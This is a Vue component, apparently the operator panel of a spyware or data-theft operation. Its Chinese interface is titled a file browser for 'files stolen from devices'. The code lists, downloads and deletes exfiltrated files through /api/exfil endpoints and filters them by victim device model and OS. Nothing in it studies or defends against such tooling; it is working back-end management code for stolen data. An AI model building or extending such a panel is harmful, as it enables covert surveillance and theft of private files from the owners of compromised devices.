<template>
  <div class="filebrowser-page">
  <div class="page-card">
    <div class="page-header">
      <div>
        <div class="page-title">文件浏览器</div>
        <div class="page-subtitle">从设备窃取的文件列表</div>
      </div>
      <el-button type="primary" plain @click="refresh">
        <el-icon><Refresh /></el-icon>
        <span>刷新</span>
      </el-button>
    </div>

    <el-breadcrumb separator="/" style="margin-bottom:12px;">
      <el-breadcrumb-item :to="{ path: '' }" @click="goPath('')">
        <el-icon><Folder /></el-icon>根目录
      </el-breadcrumb-item>
      <el-breadcrumb-item v-for="(seg, idx) in pathSegs" :key="idx">
        {{ seg }}
      </el-breadcrumb-item>
    </el-breadcrumb>

    <div class="search-bar">
      <el-input v-model="filters.q" placeholder="搜索文件名" clearable style="width:280px;" @clear="loadList" @keyup.enter="loadList">
        <template #prefix><el-icon><Search /></el-icon></template>
      </el-input>
      <el-select v-model="filters.device_uuid" placeholder="设备" clearable style="width:240px;">
        <el-option v-for="d in devices" :key="d.uuid" :label="d.label" :value="d.uuid" />
      </el-select>
      <el-button type="primary" @click="loadList">搜索</el-button>
    </div>

    <el-table :data="list" stripe @row-click="onRowClick" :row-class-name="rowClass">
      <el-table-column width="42">
        <template #default="{ row }">
          <el-icon v-if="row.is_dir" style="color:#e6a23c;"><Folder /></el-icon>
          <el-icon v-else style="color:#409eff;"><Document /></el-icon>
        </template>
      </el-table-column>
      <el-table-column prop="name" label="文件名" min-width="260">
        <template #default="{ row }">
          <span :style="{ cursor: 'pointer', color: row.is_dir ? '#e6a23c' : '#303133' }">{{ row.name }}</span>
        </template>
      </el-table-column>
      <el-table-column prop="size" label="大小" width="120">
        <template #default="{ row }">{{ row.is_dir ? '-' : formatSize(row.size) }}</template>
      </el-table-column>
      <el-table-column prop="path" label="路径" show-overflow-tooltip>
        <template #default="{ row }"><span class="mono text-muted">{{ row.path }}</span></template>
      </el-table-column>
      <el-table-column prop="device_uuid" label="设备" width="140">
        <template #default="{ row }"><span class="mono text-muted">{{ shortUuid(row.device_uuid) }}</span></template>
      </el-table-column>
      <el-table-column prop="modified" label="修改时间" width="170">
        <template #default="{ row }"><span class="text-muted">{{ formatDate(row.modified || row.created_at) }}</span></template>
      </el-table-column>
      <el-table-column label="操作" width="200" fixed="right">
        <template #default="{ row }">
          <el-button v-if="!row.is_dir" type="primary" link size="small" @click.stop="download(row)">下载</el-button>
          <el-button v-if="row.is_dir" type="primary" link size="small" @click.stop="goPath(row.path)">进入</el-button>
          <el-button type="danger" link size="small" @click.stop="deleteRow(row)">删除</el-button>
        </template>
      </el-table-column>
    </el-table>

    <el-pagination
      v-model:current-page="page"
      v-model:page-size="pageSize"
      :page-sizes="[50, 100, 200]"
      :total="total"
      layout="total, sizes, prev, pager, next"
      background
      style="justify-content:flex-end;margin-top:16px;"
      @current-change="loadList"
      @size-change="loadList"
    />
  </div>
  </div>
</template>

<script setup>
import { ref, reactive, computed, onMounted } from 'vue'
import { ElMessage, ElMessageBox } from 'element-plus'
import { Search, Refresh, Folder, Document } from '@element-plus/icons-vue'
import axios from '../utils/axios'
import { formatDate, shortUuid } from '../utils/twofa'

const list = ref([])
const total = ref(0)
const page = ref(1)
const pageSize = ref(100)
const currentPath = ref('')
const devices = ref([])
const filters = reactive({ q: '', device_uuid: '' })

const pathSegs = computed(() => currentPath.value ? currentPath.value.split('/').filter(Boolean) : [])

function rowClass({ row }) { return row.is_dir ? 'row-dir' : '' }
function onRowClick(row) { if (row.is_dir) goPath(row.path) }

function formatSize(s) {
  if (!s) return '-'
  if (s < 1024) return s + ' B'
  if (s < 1024 * 1024) return (s / 1024).toFixed(1) + ' KB'
  if (s < 1024 * 1024 * 1024) return (s / 1024 / 1024).toFixed(1) + ' MB'
  return (s / 1024 / 1024 / 1024).toFixed(2) + ' GB'
}

function goPath(p) {
  currentPath.value = p || ''
  page.value = 1
  loadList()
}

function refresh() { loadList() }

function download(row) {
  ElMessage.success('开始下载 ' + row.name)
  try {
    const token = localStorage.getItem('token') || ''
    const url = token
      ? `/api/exfil/${row.id}/download?token=${encodeURIComponent(token)}`
      : `/api/exfil/${row.id}/download`
    window.open(url, '_blank')
  } catch (_) {}
}

async function deleteRow(row) {
  try {
    await ElMessageBox.confirm(`确认删除${row.is_dir ? '目录' : '文件'}「${row.name}」？`, '删除', { type: 'warning' })
    await axios.delete(`/api/exfil/${row.id}`)
    ElMessage.success('已删除')
    loadList()
  } catch (_) {}
}

async function loadList() {
  try {
    const params = {
      skip: (page.value - 1) * pageSize.value,
      limit: pageSize.value,
      category: 'files',
      device_uuid: filters.device_uuid || undefined,
      search: filters.q || undefined,
    }
    const res = await axios.get('/api/exfil', { params })
    const raw = Array.isArray(res.data?.items) ? res.data.items : (Array.isArray(res.data) ? res.data : [])
    list.value = raw.map(r => {
      const filePath = r.file_name || r.path || ''
      const baseName = filePath ? String(filePath).split(/[\\/]/).pop() : (r.title || 'file')
      const ext = baseName ? (baseName.includes('.') ? baseName.split('.').pop() : '') : ''
      const isDir = r.is_dir === true || String(r.mime_type || '').toLowerCase().includes('directory') || (!ext && !r.size)
      return {
        ...r,
        id: r.id,
        name: r.name || baseName || `FILE_${r.id}`,
        is_dir: isDir,
        path: r.path || filePath,
        size: r.size != null ? r.size : r.file_size,
        mime_type: r.mime_type || (ext ? ext.toUpperCase() : ''),
        device_uuid: r.device_uuid || '',
        modified: r.modified || r.created_at || r.uploaded_at,
        created_at: r.created_at || r.uploaded_at,
      }
    }).filter(p => p != null && p.id != null)
    total.value = res.data?.total ?? list.value.length
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '文件列表加载失败'
    ElMessage.error(msg)
    list.value = []
    total.value = 0
  }
}

async function loadDevices() {
  try {
    const res = await axios.get('/api/devices', { params: { skip: 0, limit: 200 } })
    const raw = Array.isArray(res.data?.items) ? res.data.items : (Array.isArray(res.data) ? res.data : [])
    devices.value = raw
      .map(d => {
        const uuid = d.device_uuid != null ? String(d.device_uuid) : (d.uuid != null ? String(d.uuid) : '')
        if (!uuid) return null
        const model = d.device_model || d.model || ''
        const os = d.os_version || d.os || ''
        const tag = [model, os].filter(Boolean).join(' ')
        const label = `${shortUuid(uuid)}${tag ? ' ' + tag : ''}`
        return { uuid, label }
      })
      .filter(x => x && x.uuid && x.label)
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '设备列表加载失败'
    ElMessage.error(msg)
    devices.value = []
  }
}

onMounted(() => {
  loadDevices()
  loadList()
})
</script>

<style scoped>
.row-dir { background: #fdfaed !important; }
:deep(.row-dir:hover > td) { background: #fff8e1 !important; }
</style>
